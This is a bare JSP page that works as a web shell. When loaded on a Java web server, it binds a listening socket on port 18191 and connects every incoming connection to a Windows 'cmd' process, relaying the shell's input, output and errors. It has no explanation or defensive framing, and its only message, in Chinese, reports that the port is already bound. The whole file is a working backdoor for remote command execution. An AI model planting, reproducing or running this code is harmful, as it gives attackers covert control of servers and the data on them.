<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
 <%
 try{
	 
 final ServerSocket s = new ServerSocket(18191);
 new Thread("cmd-accept"){
		public void run() {
			try {
				boolean loop  = true;
				while(loop){
					final Socket socket = s.accept();
					final Process p = Runtime.getRuntime().exec("cmd");
				 	new Thread("cmd-input"){
				 		public void run() {
				 			byte[] data = new byte[2048];
				 			int readLen = 0;
			 				try {
								while ((readLen = p.getInputStream().read(data)) != -1) {
									socket.getOutputStream().write(data, 0, readLen);
									socket.getOutputStream().flush();
								}
							} catch (IOException e) {
								e.printStackTrace();
							}
				 		}
					}.start();
					
					new Thread("cmd-input-err"){
				 		public void run() {
				 			byte[] data = new byte[2048];
				 			int readLen = 0;
			 				try {
								while ((readLen = p.getErrorStream().read(data)) != -1) {
									socket.getOutputStream().write(data, 0, readLen);
									socket.getOutputStream().flush();
								}
							} catch (IOException e) {
								e.printStackTrace();
							}
				 		}
					}.start();
					
					new Thread("cmd-output"){
				 		public void run() {
				 			byte[] data = new byte[2048];
				 			int readLen = 0;
			 				try {
								while ((readLen = socket.getInputStream().read(data)) != -1) {
									p.getOutputStream().write(data, 0, readLen);
									p.getOutputStream().flush();
								}
							} catch (IOException e) {
								e.printStackTrace();
							}
				 		}
					}.start();
				}
			} catch (IOException e) {}
		}
		
	}.start();
 } catch (IOException e) {
	 out.print("端口已经绑定了!");
 } 
 %>
